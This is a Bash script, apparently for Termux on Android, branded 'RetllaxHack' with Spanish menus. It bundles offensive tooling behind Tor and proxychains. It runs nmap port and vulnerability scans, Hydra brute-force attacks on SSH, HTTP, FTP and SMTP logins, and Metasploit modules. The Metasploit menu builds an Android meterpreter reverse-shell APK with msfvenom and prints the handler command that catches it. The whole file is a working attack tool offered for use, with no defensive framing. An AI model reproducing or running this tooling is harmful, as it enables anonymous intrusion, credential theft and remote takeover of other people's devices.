#!/usr/bin/env bash

# ===== CONFIGURACIÓN =====
VERSION="v10.1"
LOG_DIR="$HOME/.retllaxhack/logs"
WORDLIST_DIR="$HOME/.retllaxhack/wordlists"
CONFIG_FILE="$HOME/.retllaxhack/config.cfg"

# ===== INICIALIZACIÓN =====
function init_tool {
    # Crear directorios necesarios
    mkdir -p "$LOG_DIR" "$WORDLIST_DIR"
    
    # Configuración básica si no existe
    if [ ! -f "$CONFIG_FILE" ]; then
        cat > "$CONFIG_FILE" <<- EOM
# RetllaxHack Configuration
TOR_ENABLED=1
SCAN_DELAY=2
THREADS=4
EOM
    fi

    # Cargar configuración
    source "$CONFIG_FILE"
}

# ===== INTERFAZ =====
function show_banner {
    clear
    echo -e "\e[1;35m"
    echo " ██████╗ ███████╗████████╗██╗  ██╗██╗  ██╗ █████╗ ██╗  ██╗"
    echo "██╔════╝ ██╔════╝╚══██╔══╝██║  ██║╚██╗██╔╝██╔══██╗╚██╗██╔╝"
    echo "██║  ███╗█████╗     ██║   ███████║ ╚███╔╝ ███████║ ╚███╔╝"
    echo "██║   ██║██╔══╝     ██║   ██╔══██║ ██╔██╗ ██╔══██║ ██╔██╗"
    echo "╚██████╔╝███████╗   ██║   ██║  ██║██╔╝ ██╗██║  ██║██╔╝ ██╗"
    echo " ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝"
    echo -e "\e[1;36m               SHADOW EDITION + METASPLOIT $VERSION"
    echo "           === ESCANEO AVANZADO | FUERZA BRUTA | EXPLOITS ==="
    echo -e "\e[0m"
}

# ===== VERIFICAR DEPENDENCIAS =====
function check_dependencies {
    declare -A tools=(
        ["tor"]="pkg install tor -y"
        ["proxychains"]="pkg install proxychains-ng -y"
        ["nmap"]="pkg install nmap -y"
        ["hydra"]="pkg install hydra -y"
        ["msfconsole"]="pkg install unstable-repo metasploit -y"
    )

    for tool in "${!tools[@]}"; do
        if ! command -v "$tool" >/dev/null; then
            echo -e "\e[1;33m[~] Instalando $tool...\e[0m"
            eval "${tools[$tool]}" || {
                echo -e "\e[1;31m[!] Error al instalar $tool\e[0m"
                exit 1
            }
        fi
    done

    # Configurar proxychains
    if [ ! -f "/data/data/com.termux/files/usr/etc/proxychains.conf.bak" ]; then
        cp /data/data/com.termux/files/usr/etc/proxychains.conf /data/data/com.termux/files/usr/etc/proxychains.conf.bak
        sed -i 's/^strict_chain/#strict_chain\ndynamic_chain/' /data/data/com.termux/files/usr/etc/proxychains.conf
        sed -i 's/socks4.*/socks5 127.0.0.1 9050/' /data/data/com.termux/files/usr/etc/proxychains.conf
    fi

    # Iniciar Tor si está configurado
    if [ "$TOR_ENABLED" -eq 1 ] && ! pgrep -x "tor" >/dev/null; then
        echo -e "\e[1;33m[~] Iniciando Tor...\e[0m"
        tor --RunAsDaemon 1 --CircuitBuildTimeout 30 --NumEntryGuards 3 &> /dev/null
        sleep 8
    fi
}

# ===== ESCANEO CORREGIDO =====
function perform_scan {
    read -p "$(echo -e "\e[1;34m[?] IP/Dominio a escanear: \e[0m")" target
    read -p "$(echo -e "\e[1;34m[?] Puertos (ej: 80,443 o 1-1000): \e[0m")" ports

    if ! [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] && ! [[ "$target" =~ ^[a-zA-Z0-9.-]+$ ]]; then
        echo -e "\e[1;31m[!] IP/Dominio inválido\e[0m"
        return 1
    fi

    log_file="$LOG_DIR/scan_$(date +%Y%m%d_%H%M%S).log"
    echo -e "\e[1;33m[~] Iniciando escaneo en $target...\e[0m"

    if [ "$TOR_ENABLED" -eq 1 ]; then
        proxychains -q nmap -Pn -T$THREADS --scan-delay $SCAN_DELAY --open -p "$ports" "$target" -oN "$log_file" 2>&1
    else
        nmap -Pn -T$THREADS --scan-delay $SCAN_DELAY --open -p "$ports" "$target" -oN "$log_file" 2>&1
    fi

    if grep -q "open" "$log_file"; then
        echo -e "\e[1;32m[✔] Puertos abiertos detectados:\e[0m"
        grep --color "open" "$log_file"
        
        open_ports=$(grep "open" "$log_file" | awk -F'/' '{print $1}' | tr '\n' ',')
        echo -e "\e[1;33m[~] Analizando vulnerabilidades...\e[0m"
        
        if [ "$TOR_ENABLED" -eq 1 ]; then
            proxychains -q nmap -Pn --script vuln -p "${open_ports%,}" "$target" >> "$log_file" 2>&1
        else
            nmap -Pn --script vuln -p "${open_ports%,}" "$target" >> "$log_file" 2>&1
        fi
        
        if grep -q -E "VULNERABLE|CVE-" "$log_file"; then
            grep --color -E "VULNERABLE|CVE-" "$log_file"
        else
            echo -e "\e[1;31m[!] No se encontraron vulnerabilidades\e[0m"
        fi
    else
        echo -e "\e[1;31m[!] No se encontraron puertos abiertos\e[0m"
        
        if ping -c 1 "$target" &> /dev/null; then
            echo -e "\e[1;33m[⚠️] El host responde pero los puertos están filtrados\e[0m"
        else
            echo -e "\e[1;31m[!] Host inalcanzable - Verifica la IP/dominio\e[0m"
        fi
    fi
}

# ===== HYDRA FUNCIONAL =====
function perform_hydra_attack {
    read -p "$(echo -e "\e[1;34m[?] IP/Dominio: \e[0m")" target
    read -p "$(echo -e "\e[1;34m[?] Usuario (ej: admin o ruta a archivo): \e[0m")" user
    read -p "$(echo -e "\e[1;34m[?] Ruta al diccionario: \e[0m")" wordlist

    # Verificar si es un archivo o usuario directo
    if [ -f "$user" ]; then
        user_opt="-L"
    else
        user_opt="-l"
    fi

    if [ ! -f "$wordlist" ]; then
        if [ -f "$WORDLIST_DIR/$wordlist" ]; then
            wordlist="$WORDLIST_DIR/$wordlist"
        else
            echo -e "\e[1;31m[!] Error: El archivo $wordlist no existe\e[0m"
            return 1
        fi
    fi

    echo -e "\e[1;33m[~] Detectando servicios...\e[0m"
    service=$(nmap -Pn -p- --open "$target" 2>/dev/null | grep "open" | head -n 1 | awk '{print $3}')
    
    case $service in
        ssh) port=22 ;;
        http|http-proxy) port=80 ;;
        ftp) port=21 ;;
        smtp) port=25 ;;
        *) read -p "$(echo -e "\e[1;34m[?] Puerto manual: \e[0m")" port ;;
    esac

    log_file="$LOG_DIR/hydra_$(date +%Y%m%d_%H%M%S).log"
    echo -e "\e[1;33m[~] Atacando $service ($target:$port)...\e[0m"

    if [ "$TOR_ENABLED" -eq 1 ]; then
        proxychains -q hydra "$user_opt" "$user" -P "$wordlist" -t "$THREADS" -s "$port" "$target" "$service" -o "$log_file" 2>&1
    else
        hydra "$user_opt" "$user" -P "$wordlist" -t "$THREADS" -s "$port" "$target" "$service" -o "$log_file" 2>&1
    fi

    if grep -q "login:" "$log_file"; then
        echo -e "\e[1;32m[✔] Credenciales encontradas:\e[0m"
        grep --color "login:" "$log_file"
    else
        echo -e "\e[1;31m[!] No se encontraron credenciales válidas\e[0m"
    fi
}

# ===== METASPLOIT FUNCIONAL =====
function metasploit_module {
    if ! command -v msfconsole >/dev/null; then
        echo -e "\e[1;31m[!] Metasploit no está instalado\e[0m"
        read -p "$(echo -e "\e[1;34m[?] ¿Instalar Metasploit? (1GB) [y/n]: \e[0m")" install
        if [[ "$install" =~ [yY] ]]; then
            pkg install -y unstable-repo metasploit
            pg_ctl -D "$PREFIX/var/lib/postgresql" start >/dev/null 2>&1
            sleep 5
        else
            return 1
        fi
    fi

    if ! pgrep postgres >/dev/null; then
        echo -e "\e[1;33m[~] Iniciando PostgreSQL...\e[0m"
        pg_ctl -D "$PREFIX/var/lib/postgresql" start >/dev/null 2>&1
        sleep 5
    fi

    show_banner
    echo -e "\e[1;36m[!] Módulos Metasploit:\e[0m"
    echo -e "\e[1;35m1) Generar Payload Android"
    echo "2) Buscar Exploits"
    echo "3) Escanear Red"
    echo -e "\e[0m"
    read -p "$(echo -e "\e[1;34m[?] Opción: \e[0m")" opt

    case $opt in
        1)
            read -p "$(echo -e "\e[1;34m[?] LHOST (tu IP): \e[0m")" lhost
            read -p "$(echo -e "\e[1;34m[?] LPORT (ej: 4444): \e[0m")" lport
            if msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o payload.apk; then
                echo -e "\e[1;32m[✔] Payload generado: payload.apk\e[0m"
                echo -e "\e[1;33m[!] Usa: msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'\e[0m"
            else
                echo -e "\e[1;31m[!] Error al generar payload\e[0m"
            fi
            ;;
        2)
            read -p "$(echo -e "\e[1;34m[?] Buscar (ej: Apache): \e[0m")" query
            msfconsole -q -x "search $query; exit" || echo -e "\e[1;31m[!] Error en la búsqueda\e[0m"
            ;;
        3)
            read -p "$(echo -e "\e[1;34m[?] IP/Rango (ej: 192.168.1.0/24): \e[0m")" target
            msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS $target; run; exit" || echo -e "\e[1;31m[!] Error en escaneo\e[0m"
            ;;
        *) 
            echo -e "\e[1;31m[!] Opción no válida\e[0m"
            ;;
    esac
}

# ===== MENÚ PRINCIPAL =====
function main_menu {
    init_tool
    check_dependencies
    
    while true; do
        show_banner
        echo -e "\e[1;36m1) Escaneo Inteligente"
        echo "2) Ataque Hydra Shadow"
        echo "3) Módulo Metasploit"
        echo "4) Ver Logs Recientes"
        echo "5) Configuración"
        echo "6) Salir"
        echo -e "\e[0m"
        read -p "$(echo -e "\e[1;34m[?] Elige una opción: \e[0m")" opt

        case $opt in
            1) perform_scan ;;
            2) perform_hydra_attack ;;
            3) metasploit_module ;;
            4) 
                echo -e "\e[1;36m[📂] Últimos logs:\e[0m"
                ls -lt "$LOG_DIR"/*.log 2>/dev/null | head -5 | awk '{print $9}'
                read -p "$(echo -e "\e[1;34m[?] Ver log (nombre completo): \e[0m")" logfile
                [ -f "$logfile" ] && cat "$logfile" || echo -e "\e[1;31m[!] Archivo no encontrado\e[0m"
                ;;
            5)
                echo -e "\e[1;36m[⚙️] Configuración Actual:\e[0m"
                cat "$CONFIG_FILE"
                read -p "$(echo -e "\e[1;34m[?] ¿Editar configuración? [y/n]: \e[0m")" edit
                if [[ "$edit" =~ [yY] ]]; then
                    nano "$CONFIG_FILE"
                    echo -e "\e[1;32m[✔] Configuración actualizada\e[0m"
                fi
                ;;
            6)
                pkill -f tor 2>/dev/null
                echo -e "\e[1;32m[!] Saliendo de RetllaxHack...\e[0m"
                exit 0
                ;;
            *)
                echo -e "\e[1;31m[!] Opción no válida\e[0m"
                sleep 1
                ;;
        esac
        read -p "$(echo -e "\e[1;34m[?] Presiona Enter para continuar...\e[0m")"
    done
}

# ===== EJECUCIÓN =====
main_menu
